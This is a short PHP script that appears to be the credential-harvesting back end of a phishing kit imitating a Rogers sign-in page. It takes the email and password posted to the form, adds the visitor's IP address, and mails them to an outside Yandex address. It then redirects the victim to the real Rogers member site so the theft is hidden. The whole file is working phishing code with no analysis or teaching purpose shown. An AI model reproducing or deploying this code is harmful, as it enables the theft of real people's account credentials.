<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || OG || :------\n";
$message .= "email: ".$_POST['formtext1']."\n";
$message .= "Pass: ".$_POST['formtext2']."\n";
$message .= "----: || On God || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="onlineaccesss@yandex.com";
$subject = "Rogers Wire| ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://rogersmembercentre.com/rmcapp/remc.html?fbclid=IwAR1Q-HOR_Iviqojo3-lXCZQeXJVjjAuCu8RCPOSUau1PsCstPPKGC0KlHyA#/signin");
?>